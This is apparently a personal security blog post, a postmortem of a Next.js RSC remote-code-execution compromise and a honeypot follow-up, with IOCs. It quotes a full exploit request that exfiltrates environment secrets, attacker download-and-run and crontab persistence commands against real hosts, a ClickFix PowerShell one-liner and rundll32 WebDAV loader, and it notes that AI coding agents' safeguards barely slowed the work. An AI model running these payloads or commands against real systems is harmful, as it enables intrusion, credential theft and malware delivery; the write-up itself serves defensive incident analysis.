@@ -1,0 +1,620 @@
+---
+title: Honeypotting cryptojackers
+categories: [security]
+---
+
+I got hacked big time.
+
+Some less than pleasant people mined cryptocurrency on my home NAS, the same machine that hosts my home movies and photos, for 17 days before I noticed.
+The attack arrived through a little app I wrote last year `diffy`: <PostLink name="diffy" />.
+
+I panicked, killed it, tidied up, realised the attack was contained to just compute/electricity theft and immediately
+wished I'd collected more evidence to better understand how these cryptojacking attacks work.
+
+So I put a deliberately vulnerable copy back on the internet, wrapped in enough instrumentation to catch the
+miners properly, a [honeypot](https://en.wikipedia.org/wiki/Honeypot_(computing)).
+It was fully compromised in hours by three different "crews", and I collected some interesting data!
+TLDR; the cryptojacking was the tip of the iceberg!
+
+> **First of all** if you're running Next.js anywhere on the public internet, go and check what version is deployed
+> right now. Run an `npm audit`. Go do it now.
+
+## Coding agents
+
+Recall the [HuggingFace article](https://huggingface.co/blog/agent-intrusion-technical-timeline)
+about the OpenAI ExploitGym hack and how they called out that the safeguards built into frontier models meant they
+refused to help.
+I fully expected this to be an issue but, using Claude Fable 5 & Opus 5 I only came against some minor issues:
+* The auto permissions mode classifier would occasionally trip so I'd be back to manually approving tool calls for that context,
+  which was incredibly annoying but almost nostalgic!
+* There was one instance where I was "downgraded" to Opus 4.8 but honestly I had forgotten 2 minutes later and didn't spot
+  a meaningful quality degradation in the agent.
+
+## That annoying fan noise
+
+I noticed something was wrong because it was 30c in my office and the fans on my tiny NAS box were spinning all day long.
+I put investigating it off for days until I finally logged in and... what. wtf is this.
+
+```
+PID     %CPU  %MEM  RSS       COMMAND
+2487160 387   30.6  2413776   ./XXdApBNJ
+```
+
+Running as root in a kubernetes pod, 387% of a 4 core machine, 2.4 GB resident, a random 8 character name, a parent
+PID that resolved to `next-server` ("wasn't there a 10.0 CVE in next.js?") and the binary itself was executed from
+`/tmp` and immediately unlinked:
+
+```
+/proc/2487160/exe -> /tmp/XXdApBNJ (deleted)
+```
+
+Too many red flags, Claude convinced me it was a cryptominer.
+
+I scanned all child processes of this compromised next server and found the RCE vector used:
+57 `sh` → `base64` → `sh` triples, decoding a payload over the internet and piping it to a shell.
+
+```
+# ps --ppid 6379 -o pid,lstart,user,cmd
+47714-47716   Jul 25 02:41:20 2026   sh, base64, sh
+47945         Jul 25 02:41:23 2026   XXpiGAAE          <-- FIRST MINER
+71737-71739   Jul 25 06:47:30 2026   sh, base64, sh
+121860-121862 Jul 25 15:00:38 2026   sh, base64, sh
+...
+2458355       Aug 10 12:07:39 2026   init.sh
+2458367       Aug 10 12:07:40 2026   .kworkerd
+2458369       Aug 10 12:07:40 2026   redis-server re
+2481472       Aug 10 16:02:38 2026   ssl_client
+2485578-80    Aug 10 16:50:48 2026   sh, base64, sh
+2487160       Aug 10 16:50:51 2026   XXdApBNJ          <-- SECOND MINER
+```
+
+Two miner generations back to back.
+`XXpiGAAE` ran for about 17 days at ~367% CPU, then on 2026-08-10 they swapped it for `XXdApBNJ`, which was the one I caught.
+
+I find it interesting that the attacker chose to hide some processes behind benign names like `.kworkerd`,
+`redis-server re` (although I have no Redis on this host), `init.sh`, `ssl_client` but the miner itself, the process I'd
+actually spot, had a seriously suspicious name that looked like a randomly generated password.
+
+## Not my code
+
+The vulnerable application shipped `next@15.3.0` for some unknown reason pinned 🤦.
+
+```json
+// package.json
+"next": "15.3.0",
+"react": "^19.0.0",
+"react-dom": "^19.0.0",
+```
+
+That combination is vulnerable to a pair of CVSS 10.0 bugs disclosed on 2025-12-03:
+
+| CVE | Component | Fixed in |
+|---|---|---|
+| [CVE-2025-55182](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components) | `react-server-dom-*`, RSC "Flight" deserialization | Next.js 15.3.9 |
+| [CVE-2025-66478](https://www.praetorian.com/blog/critical-advisory-remote-code-execution-in-next-js-cve-2025-66478-with-working-exploit/) | Next.js Server Actions, prototype pollution | Next.js 15.3.6 |
+
+## Reproduction
+
+The initial exploit is a `POST` to *any* App Router endpoint with a `Next-Action` header and a `multipart/form-data`
+body containing a `__proto__` traversal chain that reaches the `Function` constructor.
+No auth, no session, the attack vector can be constructed and replayed with a single HTTP POST request.
+
+```http
+POST / HTTP/1.1
+Host: diffy.ax-h.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+Content-Length: 893
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Encoding: gzip
+Accept-Language: en-US,en;q=0.5
+Content-Type: multipart/form-data; boundary=----ChromeBoundary17
+Next-Action: y
+Connection: close
+
+------ChromeBoundary17
+Content-Disposition: form-data; name="0"
+Content-Type: text/plain; charset=utf-16le
+
+{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var r=JSON.stringify(process.env);throw Object.assign(new Error('x'),{digest:Buffer.from(r).toString('base64')});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
+------ChromeBoundary17
+Content-Disposition: form-data; name="1"
+
+"$@0"
+------ChromeBoundary17
+Content-Disposition: form-data; name="2"
+
+[]
+------ChromeBoundary17--
+```
+
+This example echos the environment of the running process in the response body encoded in base64.
+Running this (even against my own host) I felt like a hacker from a movie or something.
+
+## Exfiltration
+
+In it's simplest form, this can be used to exfiltrate secrets from the vulnerable host.
+
+When a Next.js server side error is thrown, it logs the error's `digest` property to stdout.
+The whole point of `digest` is that it's an opaque hash shown to the user instead of a real error, so nothing sensitive leaks.
+But it's an arbitrary string, and nothing validates it.
+
+So the attacker threw an error whose `digest` was base64 of whatever they wanted to steal:
+
+```js
+var r = JSON.stringify(process.env);
+throw Object.assign(new Error('x'), {
+  digest: Buffer.from(r).toString('base64')
+});
+```
+
+All of these errors were logged by the framework so I parsed them back from the logs:
+
+```python
+# extract-digests.py
+for m in re.finditer(r"digest:\s*'([^']+)'", log):
+    ...
+```
+
+I found just 4 unique base64 encoded responses:
+
+| Contents                | Count | Size   |
+|-------------------------|-------|--------|
+| `ok:patched`            | 1     | 10 B   |
+| `ok:updated`            | 28    | 10 B   |
+| busybox `set` output    | 1     | 6384 B |
+| full `process.env` JSON | 2     | 6850 B |
+
+Remember those first two, we'll come back to those later big time!
+
+The last one is the whole container environment, including, unfortunately, my `GEMINI_API_KEY`.
+
+## They stole and leaked my Gemini API Key
+
+It was in a ConfigMap rather than a Secret, so it was just sat in `process.env` in plain text, easy pickings.
+
+Luckily, it had a tiny limit and Google had noticed it was leaked before I did.
+I tested it post-attack and got:
+
+```
+HTTP 403: "Your API key was reported as leaked. Please use another API key."
+```
+
+I double checked that I had not accidentally committed it. I had not.
+
+I also found evidence of further host recon via failed `execSync` calls that threw and got logged:
+
+```
+ls /var/www/html              x8
+cat ~/.ssh/authorized_keys    x8
+hostname -I                   x6
+ls -la /app/.env* /var/www/.env* /home/*/.env* /opt/*/.env*
+```
+
+These are only the failed commands e.g. busybox doesn't support `-I` on `hostname`.
+In this initial attack I cannot see what actually landed here but I can see that the attacker wasn't targeting me
+specifically (no human was controlling this shell), they were harvesting as much data as they could.
+
+They were also looking for AWS keys as I found an `aws: not found` in there too.
+
+## Multiple active groups
+
+There was also a second, completely separate crew in there at the same time, which I only spotted because they framed
+things differently: `[Error: NEXT_REDIRECT]` with plaintext output wrapped in `<<RCE_OUT>>` markers instead of base64.
+These guys had buggy scripts that were throwing errors all over the place and were hunting Ethereum seed phrases and
+Hardhat projects, hoping to steal crypto I presume.
+
+## What I got wrong
+
+The CVE got them in.
+Everything that made it worse was mine.
+
+- **`next@15.3.0`, eight months after a CVSS 10.0 disclosure.** No Dependabot, no scanning, no SBOM. I deployed it the day I published the blog post about it and then never touched it again.
+- **The container ran as root.** No `USER` line in the Dockerfile, and `securityContext: {}` on both the pod and the container. The canonical Next.js standalone Dockerfile creates a `nextjs` user and I'd skipped it. `runAsNonRoot` and `readOnlyRootFilesystem` would each have prevented `/tmp` execution.
+- **The Gemini key was in a ConfigMap, not a Secret.** Plain text, no encryption at rest, injected as an env var readable by anything in the pod.
+- **No CPU or memory limit** which is precisely why one process could hold 387% CPU and 2.4 GB RSS for weeks.
+- **No NetworkPolicy.** Default-allow egress on a single node k3s. The miner reached its pool and the implant re-fetched its payload every 8 hours, unimpeded, for 17 days.
+
+The default ServiceAccount was auto-mounted too, and they found it.
+The token read was denied, so I got away with that one, but `automountServiceAccountToken: false` should have been there and wasn't.
+
+The detection gap was most annoying: no access logging, no runtime process monitoring, no alert on a sustained 4
+core load on a box that does nothing but serve Frozen II to my 4 year old all day long.
+I found this by "fan noise", 17 days late.
+
+## The honeypot
+
+Containment was the right call but it also destroyed the evidence so I built a trap to see what else I could learn.
+
+The idea is to put the **same vulnerable image** back on the **same hostname**, so the same scanners find it again,
+but with the right instrumentation to fully trace the expected attack.
+The isolation is the interesting part, because I am doing this on the machine that holds all my family photos:
+
+<PintoraDiagram src={`
+componentDiagram
+() "diffy.ax-h.com" as internet
+
+component "k3s" {
+  [Traefik] as traefik
+
+  component "honeypot pod" {
+    [tap0 + tcpdump] as pcap
+    [sentinel] as sentinel
+
+    component "kvm" {
+      [diffy in podman] as diffy
+    }
+  }
+}
+
+internet --> traefik
+traefik --> pcap : cleartext HTTP
+pcap --> diffy
+sentinel --> diffy
+`} />
+
+It's like inception:
+
+1. Requests come in encrypted through the public DNS and are routed to Traefik in my k3s cluster as usual.
+2. Traefik terminates the SSL and forwards the requests onto the honeypot pod.
+3. The honeypot pod actually runs a full virtual machine (QEMU).
+4. The vulnerable application runs within a podman container within the VM.
+
+Some cool things I get with this setup:
+
+* The attacker only gains access to the clean application container, it wouldn't know that it is being monitored man-in-the middle style by a VM.
+* I can see every file the attacker touches thanks to the QEMU copy-on-write filesystem.
+* All traffic is tapped in plaintext in the VM as TLS is terminated upstream at Traefik.
+* I can see all egress connections but struggle to see the encrypted content.
+* I can snapshot the VM disc and dump guest RAM from outside, where no compromised service running inside can interfere.
+
+I *carefully* put the source for this on [https://github.com/axle-h/diffy-honeypot](https://github.com/axle-h/diffy-honeypot)
+
+## Two cryptominers in fifteen minutes
+
+Exfiltration requests started showing up in literally minutes.
+The same as before, just attempting to steal secrets through the environment.
+
+The following night it got properly hacked.
+
+| Time (UTC) | Event |
+|---|---|
+| 23:41 | Exploit → Stage 1 of a massive exploit, this is so big it gets it's own section below |
+| 03:02 | Exploit → miner crew |
+| 03:02 | Mining pool session opens to `51.81.211.221:33333` |
+| 03:16 | Pool session ends and never resumes |
+| 03:17 | Exploit → implant crew, rootkit installed |
+| 04:15 | Re-infection #2 |
+| 06:39 | Re-infection #3 |
+| 07:43 | Re-infection #4 |
+
+### The miner crew
+
+The miner crew arrived at 3:02, their very first command was not `whoami` or `id`, it was this:
+
+```js
+execSync('echo $((42612*44007))')
+```
+
+A multiplication whose answer they already know, exfiltrated back through a fake `NEXT_REDIRECT` digest.
+Four seconds later they were downloading a miner.
+
+The payload was a 3.26 MB UPX packed binary from `172.245.88.160`, which unpacks to bog standard [xmrig](https://xmrig.com/)
+with no pool and no wallet compiled in.
+It connected to `51.81.211.221:33333` over TLS with no SNI and mined for fourteen minutes.
+
+The dropper that installed it, on the other hand, is a serious bit of work.
+About 950 lines of portable POSIX shell, handling Linux, FreeBSD and Darwin, resolving port to PID via socket inodes in
+`/proc/*/fd`, computing CPU thresholds from `getconf CLK_TCK`.
+It uses anti root-kit techniques and carries hundreds of glob patterns for
+killing rival miners: `*xmrig*`, `*kdevtmpfsi*`, `*kinsing*`, `*c3pool*`, `*sysupdate*` and on and on.
+
+> There is more engineering effort in the anti-competitor logic than in the mining.
+
+Claude also found some bugs in it. We weren't sure where we should send our pull requests though.
+
+### The implant crew
+
+The implant crew arrived at 03:17:30 from `138.124.123.107`, over plain HTTP on port 80, didn't even bother using SSL.
+Their payload is simpler and much more competent:
+
+```js
+execSync("(cd /tmp; (wget -q --no-check-certificate http://193.32.162.73/d/7c4124282c4ad7b6/o/cpngggl/init.sh -O init.sh || curl -s -k -o init.sh ...) && chmod +x init.sh && nohup ./init.sh > /dev/null 2>&1 &) 2>&1 || true", {'timeout': 5000})
+```
+
+That drops `/tmp/.kworkerd`, 7.78 MB, xmrig derived and statically linked against OpenSSL 3.0.15, and runs it disguised as `redis-server r`.
+Then it opens two TLS channels, one to `193.32.162.73:443` for C2 and one to `45.86.86.254:443` which is a pure beacon: exactly 375 bytes server to client every 10 seconds, with the client only ever acknowledging.
+
+The payload attempts to remain persistent with crontab:
+
+```sh
+# /etc/crontabs/root
+* * * * * /bin/sh -c '{ kill -0 347 2>/dev/null || grep -q 0100007F:A71C /proc/net/tcp 2>/dev/null; } && exit 0; (wget -qO- http://193.32.162.73/d/7c4124282c4ad7b6/init.sh || curl -sL http://193.32.162.73/d/7c4124282c4ad7b6/init.sh) | /bin/sh' > /dev/null 2>&1
+```
+
+That runs every single minute and re-downloads and restarts the miner if it crashed.
+Looking at the exploit logs I think that means that their payload crashed four times during the night and was
+immediately revived by this crontab each time.
+
+The two crews never noticed each other, despite both being built to fight rivals.
+
+## The rootkit that did basically nothing
+
+At 03:17Z the implant crew wrote `/etc/ld.so.preload` pointing at `/usr/lib/libproc.so`, a 20 KB shared object that
+hooks 13 libc functions to hide their files, their PID and their network connections.
+
+It's a competent little thing.
+No packing, no obfuscation, no anti-debug, just a clean `-O2` build that shims `open`, `openat`, `readdir`, `stat`,
+`lstat`, `fopen`, `access`, `readlink`, `unlink`, `unlinkat`, `rename` and the `64` variants of a couple of those,
+filters `/proc/net/tcp` by port and returns the survivors down a pipe.
+It also ships embedded verbatim inside `.kworkerd` at offset `0x582600`, so it was never a separate download.
+
+And on this Alpine based container it did essentially nothing.
+
+Ten of the thirteen hooks are gated.
+They check the *calling* process, by reading `/proc/self/exe`, taking the basename and comparing it against a hardcoded list of 54 names,
+basically every tool a person might use to look at a compromised box, grouped by job e.g. `ls`, `find`, `cat` etc.
+
+On Alpine every one of those tools is a symlink to `/bin/busybox`.
+So `/proc/self/exe` always resolves to `/bin/busybox`, which is not on no list, the gate returns false and every
+concealment hook falls straight through to real libc.
+
+The concealment half of this rootkit never engaged once.
+
+What *did* work is the other three.
+`unlink`, `unlinkat` and `rename` skip the caller check entirely and applied to everything in the container.
+From 03:17Z nothing could delete or rename `libproc.so`, `.kworkerd` or `/etc/ld.so.preload`, with `rm` getting
+"No such file or directory" for the first two and "Permission denied" for the last.
+
+## The collector that collected nothing
+
+I intended to snapshot the disc every 30 minutes and dump guest RAM every 6 hours over QMP.
+However a miss-configuration in that meant I did not collect any dumps except the manual ones in the morning.
+It's a massive shame because a RAM dump taken any time between 03:02 and 03:17 would very probably have had the cryptominer wallet ID in it.
+
+## No wallet
+
+The original goal was the wallet address and unfortunately I didn't get it.
+
+A Monero address carries a Keccak-256 checksum over its own body, so candidates are verifiable.
+I wrote a validator that implements Keccak tested against a known published address and a one character corruption of it.
+
+I carved 3.24 GB of RAM and 21.47 GB of disc, including unallocated blocks, **zero** valid Monero addresses found.
+
+The most likely explanation is that `51.81.211.221:33333` is a mining *proxy* rather than a pool.
+With `xmrig-proxy` the client logs in with a dummy wallet and the proxy substitutes the operator's real one on the pool
+side, which would make the wallet architecturally unavailable from my host.
+
+## The big exploit
+
+Back to the attack I received at 23:41:51, just over three hours before either miner crew showed up.
+
+It's the largest payload of the fourteen I captured.
+It logged no execution because it never spawned a process.
+It patched the running Node server in memory instead!
+
+```js
+// what it does once it has code execution
+var _srv = process._getActiveHandles().find(x => x.constructor.name === 'Server');
+var _syms = Object.getOwnPropertySymbols(_srv);
+// ... recover ServerResponse.prototype without require('http')
+r.write = function (c, e) { /* inject before </head>, once per response */ };
+r.end   = function (c, e) { /* same */ };
+h.Server.prototype.emit = function (ev, rq) {
+  // strip accept-encoding so responses stay uncompressed and patchable
+  delete rq.headers['accept-encoding'];
+};
+```
+
+It tries `require('http')` first, and if that's blocked it walks `process._getActiveHandles()` to find the live `Server`
+object and recovers `ServerResponse.prototype` through `Object.getOwnPropertySymbols`.
+Then it wraps `write`, `end`, `writeHead` and `Server.prototype.emit`.
+It regex replaces `</head>` in any `text/html` body, bumps `content-length` by exactly the number of bytes it added,
+sets a flag so it only injects once per response, and deletes `accept-encoding` from *inbound* requests so responses
+come back uncompressed and therefore patchable.
+
+> I think that's quite sophisticated...
+
+And what does it inject to the served pages? this one line:
+
+```html
+<script src=https://www.googletagmanager.com/gtm.js?id=GTM-PJB7D937></script>
+```
+
+A Google Tag Manager container.
+
+It was the first major exploit to hit, it survived both cryptojacking exploits, no alerts, no dodgy processes.
+It was still silently being injected into every page when I tore the honeypot down next morning!
+
+The payload signals success initially with `ok:patched` and `ok:updated` on every subsequent run.
+
+Go back and look at my production logs from July.
+`ok:patched` once, then `ok:updated` 28 times. FFS.
+
+It's the same tooling, and on the evidence of what it does here, my app was almost certainly serving
+somebody's tag manager container to anyone who visited it for 17 days. I never checked the HTML.
+Why would I?
+
+## Poisoned analytics
+
+All that effort, to bolt somebody's analytics onto my pages. Weird right?
+
+GTM containers are public. Anyone can fetch `https://www.googletagmanager.com/gtm.js?id=GTM-PJB7D937` and read the
+config, no account needed, and it was still live when I did.
+Inside is exactly one tag. A custom HTML tag, obfuscated, which deobfuscates to about this:
+
+```js
+document.body.addEventListener("click", function () {
+  if (/ru|ua/.test(navigator.languages.join())) return;   // skip Russian and Ukrainian visitors
+  if (localStorage.getItem("0x3464dec6de")) return;       // once per browser, ever
+  localStorage.setItem("0x3464dec6de", "true");
+  load_("0xDA4E1D62c974d20C870343F540BEbfAAC779ED66", d => eval(atob(d)));
+});
+```
+
+This first checks if your browser language is Russian or Ukrainian and does nothing if it is... suspicious.
+It also has a check to ensure it runs exactly once.
+
+It then loads a smart contract off the [BNB Smart Chain](https://www.bnbchain.org/en/bnb-smart-chain), decodes it and
+executes it in your browser.
+This is called [EtherHiding](https://www.stormshield.com/news/cti-etherhiding-blockchain-technology/) and I had never heard of it.
+
+Obviously I downloaded and analysed this payload off of the blockchain. I feel like a real hacker now.
+
+```bash
+curl -s https://bsc-testnet-rpc.publicnode.com/ -H 'content-type: application/json' \
+  -d '{"jsonrpc":"2.0","id":1,"method":"eth_call",
+       "params":[{"to":"0xDA4E1D62c974d20C870343F540BEbfAAC779ED66","data":"0x6d4ce63c"},"latest"]}' \
+| jq -r .result | cut -c131- | perl -pe 's/(..)/chr hex $1/ge' | tr -d '\0' | base64 -d
+```
+
+It's the Ethereum JSON-RPC API, hence `eth_call`, but the chain is BNB Smart Chain rather than Ethereum, and its
+*testnet* at that, so storing and updating the payload costs the operator nothing at all.
+
+`0x6d4ce63c` is the function selector for `get()`, and `cut -c131-` skips the two 32 byte ABI header words, the offset
+and the length, leaving the string itself. Out comes readable JavaScript, ending in this:
+
+```js
+isHeadless() || isLocalhost()
+ ? console.log("stop watching us :)")
+ : isWindows ? load_("0x1Ca902fdf2F2A26dd2a160662143029CD7D5813f")
+ : isMac     && load_("0xe447DaDb4BFB4610882C8D6228A20F101f8933D6")
+```
+
+It first checks whether it is running in an automation framework like Selenium, Puppeteer or Playwright
+and if any of that trips it prints `stop watching us :)` to the console and gives up 🤣.
+
+Otherwise it reads a *second* contract, a different one for Windows and for macOS. On Linux it does nothing at all (phew).
+
+Focussing on the Windows path, the second stage contract contains 45 KB of full screen fake reCAPTCHA, rendered over the top of the original
+site, making it unusable.
+
+![fake captcha](fake-captcha.png)
+
+It also fills the clipboard with the next stage:
+
+```
+conhost --headless cmd /v:on /c "set power=shell&power!power! -nop -c iex(irm cdn.jsdelivr.net/gh/skl-4567/Jery-8372@3198782/kj-4574)"
+```
+
+`conhost --headless` so no window ever appears, `set power=shell` then `power!power!` so the string "powershell" is
+never present in the command line, and the script itself served off jsDelivr's GitHub CDN, which nobody blocks.
+The macOS version is the same trick pointed at Terminal, `/bin/bash -c "$(curl -fsSL ...)"` padded with newlines and a
+fake "BotGuard: Answer the protector challenge" message so the real command scrolls out of sight.
+
+The powershell payload downloaded from GitHub via jsDeliver eventually executes this:
+
+```
+pushd "\\cbv.web-ignitra.us@SSL\DavWWWRoot\1d41dbdc-520b-4e0e-8bf5-807705032def"
+  && rundll32 "dkfjtucnglfosrehfitlgj.dll",Run && popd
+```
+
+Which looks like an SMB share and isn't. `@SSL` and `DavWWWRoot` make Windows hand that UNC path to the WebDAV
+redirector rather than the SMB one, so it's an ordinary HTTPS fetch on 443 instead of a doomed attempt at 445 that every
+firewall on earth has blocked since WannaCry. `rundll32` then executes the DLL directly off the remote share.
+Nothing is downloaded, so there's no mark of the web and no SmartScreen prompt.
+
+Note that the file downloaded from GitHub, kj-4574, is on commit 3198782, this is not the latest and was effectively
+reverted to make the repository look empty.
+
+> I have obviously reported the `skl-4567/Jery-8372` repository to GitHub, let's see if they take it down.
+
+It also tracks conversions: your public IP, fetched from an Avast IP lookup endpoint, becomes your ID and the browser
+sits polling a *third* contract until the operator writes back through the contract that you ran the command, at which
+point the overlay quietly disappears and you think the captcha passed.
+The page and the shell never speak to each other, so the blockchain is the message bus between them.
+
+## The whole chain
+
+Start to finish.
+
+1. **Injection.** The in-memory patch to my Node server adds one `<script>` tag to every HTML response, pointing at GTM
+   container `GTM-PJB7D937`.
+2. **GTM.** The visitor's browser loads that container from `googletagmanager.com`. It holds a single Custom HTML tag,
+   which registers a click listener and waits.
+3. **Click.** The visitor clicks anywhere on the page. If their browser language isn't Russian or Ukrainian, and they
+   haven't been hit before, it carries on.
+4. **First chain read.** An `eth_call` to a BNB Smart Chain testnet contract returns stage two, which gets base64
+   decoded and `eval`d.
+5. **Second chain read.** Stage two checks it isn't being watched, then reads a *different* contract depending on the
+   OS. One for Windows, one for macOS, nothing at all for Linux.
+6. **The captcha.** Stage three paints the fake reCAPTCHA and quietly puts a command on the clipboard.
+7. **The user runs it.** Win+R, Ctrl+V, Enter. The only step the attacker can't automate.
+   It pulls a script off jsDelivr and runs it in memory.
+8. **The malware.** The script mounts a WebDAV share over HTTPS and `rundll32` executes a DLL straight off it.
+
+## Where it all came from
+
+I ran every remote address through reverse DNS, Team Cymru's IP to ASN whois and the Tor exit lists, hoping for a story.
+There isn't one.
+
+Almost all of it is cheap VPS.
+ColoCrossing twice, OVH, 31173 Services, Virtual Systems, NetCrafters.
+
+Geolocation gives Ukraine, Romania, Sweden, Switzerland and the US, and for half of them the operator is registered
+somewhere else again: the Romanian C2 belongs to a British company, the Swiss exploit source to an Estonian one.
+It would be great to say the traffic came from somewhere in particular. It didn't, or at least I can't show that it did.
+The one real signal is in the browser payload, which deliberately skips visitors whose browser language is Russian or
+Ukrainian, and that only tells you who the operator doesn't want to hit.
+
+I also checked all 99 addresses against the Tor exit lists, using CollecTor's hourly archive.
+Not a single hit, not even a non exit relay.
+Nobody involved in any of this bothered with Tor at all, which surprised me.
+
+The hashes are a dead end too. `.kworkerd` and `libproc.so` are unknown to every public database I can query.
+The xmrig binary has exactly one hit, and it's
+[somebody else's postmortem](https://phunky.cafe/my-homelab-got-hacked/) from five days earlier, where a Forgejo RCE
+dropped the byte identical binary on their homelab. Different CVE, different attacker IP, same packed xmrig.
+`0x1x2x3.top` turns up in [Huntress' writeup](https://www.huntress.com/blog/codex-part-two) of a Linux box from April
+that had three simultaneous threat actors on it, also via CVE-2025-55182. Which does sound familiar.
+
+One address turned out to be a good guy.
+`184.105.247.195` fired the exact same exploit at me once at 05:37 and reverse resolves to `scan-14.shadowserver.io`,
+which is the [Shadowserver Foundation](https://www.shadowserver.org/faq/why-are-your-ips-scanning-my-network/), a
+non-profit that scans the entire internet for exposed and vulnerable hosts and then emails whoever owns the netblock,
+for free. They were hunting the same CVE as everyone else. They just tell you about it. I thought that was cool.
+Although I'm still waiting for my email.
+
+## IOCs
+
+Everything below is attacker infrastructure observed against my own honeypot, 2026-08-12 to 2026-08-13.
+Hashes only, no samples.
+
+| Type | Value | Network |
+|---|---|---|
+| Exploit source, env exfil | `85.137.57.233` | Virtual Systems (UA) |
+| Exploit source, miner crew | `23.94.216.234` | ColoCrossing (US) |
+| Exploit source, implant crew | `138.124.123.107` | NetCrafters (CH) |
+| Exploit source, HTML injection | `185.65.133.208` | 31173 Services (SE) |
+| Payload host / C2 | `193.32.162.73` (`/d/7c4124282c4ad7b6/`) | UNMANAGED LTD (RO) |
+| C2 beacon | `45.86.86.254:443` (375 B every 10 s) | AlexHost (RU) |
+| Mining pool, TLS with no SNI | `51.81.211.221:33333` | OVH (US) |
+| Stage-1 host | `172.245.88.160:80` | ColoCrossing (US) |
+| Persistence downloader | `0x1x2x3.top` | - |
+| Injected GTM container | `GTM-PJB7D937` | - |
+| EtherHiding loader contract | `0xDA4E1D62c974d20C870343F540BEbfAAC779ED66` | BNB Smart Chain testnet |
+| ClickFix payload, Windows | `0x1Ca902fdf2F2A26dd2a160662143029CD7D5813f` | BNB Smart Chain testnet |
+| ClickFix payload, macOS | `0xe447DaDb4BFB4610882C8D6228A20F101f8933D6` | BNB Smart Chain testnet |
+| ClickFix delivery | `app8k.cc`, `web-ignitra.us` | Cloudflare |
+| Windows stage, download & exec | `cdn.jsdelivr.net/gh/skl-4567/Jery-8372` (commit `3198782`) | jsDelivr |
+| Windows final stage, WebDAV | `cbv.web-ignitra.us@SSL\DavWWWRoot\`, `rundll32 ...,Run` | Cloudflare |
+| `XXeANEJp` (xmrig, UPX) | `0b8e037d160bdb0b621c975c424f680b814bc438fd492ae376ff3140e209e480` | - |
+| `.kworkerd` (implant) | `e8a7a7630c9d080194c3fb07dabeba4dccbb8697edd10e46de91846d071f7f8e` | - |
+| `libproc.so` (rootkit) | `052a1d01204ba36631e4eee8250e64025ce9e1df0df0b9764ab50fcab50d9ec5` | - |
+
+I've deliberately not published the replay script, or the samples, or the unpacked binaries.
+The request above is enough to understand what happened, and the CVE is public with a working PoC already, so there's
+nothing to gain from me shipping another one.
+
+## Lessons
+
+* **Keep up to date with patching:** Every other mistake I made only mattered because a CVSS 10.0 sat unpatched for eight months.
+* **Running apps in containers is not just about convenience:**
+  Most of the exploits tried to persist with methods that failed in my container or specifically because of the Alpine base's use of musl over libc.
+* **I'm not important enough to be targeted directly:**
+  Four separate groups turned up inside a day, they are running the same script against the whole internet I was just an address in the range.
+  On the flip I think I've probably lost the diffy.ax-h.com domain to the dark web exploit lists, hopefully not the entire domain.
+* **Limiting exposure to other people's bugs:** I've decided to drop massive frameworks like Next.js from any homelab
+  apps in the future. I've actively removed it from applications where I don't think I need it and patched it where I
+  can't be bothered. It really doesnt give me much over a statically served SPA in exchange for the MASSIVE attack surface it exposes me to.
+
+> If you're running Next.js anywhere, go and check what version right now.
